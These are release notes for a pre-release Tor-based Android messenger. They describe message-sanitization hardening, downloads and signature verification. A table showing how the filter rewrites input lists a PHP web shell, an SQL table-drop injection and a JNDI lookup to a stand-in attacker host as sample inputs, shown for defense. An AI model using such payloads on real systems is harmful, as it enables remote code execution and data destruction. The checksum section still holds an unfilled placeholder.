# ONYX v1.2.3 "Forge": People, Not Programs (pre-release)

🌐 [0nyx.up.railway.app](https://0nyx.up.railway.app/) · Source: [SirRogersJackBlood/ONYX](https://github.com/SirRogersJackBlood/ONYX) · Previous: [v1.1.0](https://github.com/SirRogersJackBlood/ONYX/releases/tag/v1.1.0)

> **Pre-release (debug build).** Signed with a development key for testing. The F-Droid release will be built and signed by F-Droid from source and will **not** upgrade over this build.
>
> Final pre-release before the beta. Includes all v1.2.x changes (1.2.0 was skipped and the 1.2.2 test build was not published).

## New in v1.2.3

### Credits
The About screen now has a **CREDITS** card:
- **Design, direction & QA:** SirRogersJackBlood
- **Development:** Claude (Anthropic), AI pair-programmer
- **Built on:** libsignal (Signal) · Tor, tor-android & jtorctl (The Tor Project, Guardian Project) · Snowflake via IPtProxy · ZXing

ONYX's code was written with AI assistance and tested on real devices by its designer. Independent security review is welcome: report issues privately via [GitHub Security Advisories](https://github.com/SirRogersJackBlood/ONYX/security/advisories/new) (see `SECURITY.md`).

## Also in v1.2 (from v1.2.1)

### Security hardening: people, not programs
ONYX is now deliberately useless as an automated or hidden command channel:

- **80 characters, one line.** Enforced when sending **and** again when receiving, so a modified or older client gains nothing.
- **Code symbols stripped.** Only letters, numbers, emoji and `. , ! ? ' " - : ( )` survive. Brackets, backticks, `$ \ | ; = # % & * _ @ / ^ ~ +` are removed.
- **No consecutive symbols.** `!!!` → `!`, `--` → `-`, `?>` → `?`.
- **Invisible and look-alike characters removed.** Zero-width characters and bidi overrides are stripped; full-width look-alikes are normalized, then filtered.
- **Rate limit.** 20 messages per minute per contact, at least 0.7 s apart.
- **No attachments,** now or planned. There is no API or intent through which another app can send a message.

| Sent | Arrives as |
|---|---|
| `<?php system($_GET['c']); ?>` | `?php system(GET'c'` |
| `'; DROP TABLE users; --` | `' DROP TABLE users -` |
| `${jndi:ldap://evil.example/a}` | `jndi:ldap:evil.examplea` |
| `Hey!! Are we still on for 7:30 tonight??` | `Hey! Are we still on for 7:30 tonight?` |

### About & origin
- The in-app **About** screen now tells the ONYX origin story and explains the message rules.
- The website has a new **/ORIGIN** section and an **About** page, plus [`ABOUT.md`](https://github.com/SirRogersJackBlood/ONYX/blob/main/ABOUT.md) in the repo.

### Other
- **Version tracking on About:** shows the installed version and build number (read from the app itself), the build type, the signing certificate's SHA-256 (compare it with the value below) and a version history.
- Version **1.2.3** (versionCode 6).
- `core` tests: **28/28** (5 new security tests).

## Compatibility
- Wire protocol unchanged. Works with v1.0.0-pre1 and v1.1.0.
- Messages from older versions are sanitized when received on v1.2.3.
- Same signing key as earlier pre-releases, so installing over them keeps your data.

## Downloads

| File | For |
|---|---|
| `onyx-v1.2.3-arm64-v8a-debug.apk` | Almost all phones since 2017. **Pick this if unsure.** |
| `onyx-v1.2.3-armeabi-v7a-debug.apk` | Older 32-bit phones |
| `onyx-v1.2.3-x86_64-debug.apk` | Emulators |
| `onyx-v1.2.3-universal-debug.apk` | Any device (largest) |

## Verify

**SHA-256**
```text
<paste v1.2\SHA256SUMS.txt here after staging>
```

**Signing certificate** (`CN=Android Debug, O=Android, C=US`, expected to be the same as previous releases)
```text
SHA-256  f9eb3fcbbc2115fb3b5dcd67e842e62d80c4c2afa85dd4c5401dbdcca2ee5165
```

```powershell
Get-FileHash .\onyx-v1.2.3-arm64-v8a-debug.apk -Algorithm SHA256
apksigner verify --print-certs .\onyx-v1.2.3-arm64-v8a-debug.apk
```

## Known limitations
- Both phones must be online for delivery (messages queue and retry). Mailbox mode is planned.
- One onion address per identity; no Tor client authorization yet.
- Tor circuits are not post-quantum (message content is).
- Higher battery use than push-based messengers, by design.

---
<sub>Design, direction & QA by **SirRogersJackBlood** · Development by Claude (Anthropic) · AGPL-3.0-only · Change records CR-ONYX-2026-003, CR-ONYX-2026-004</sub>
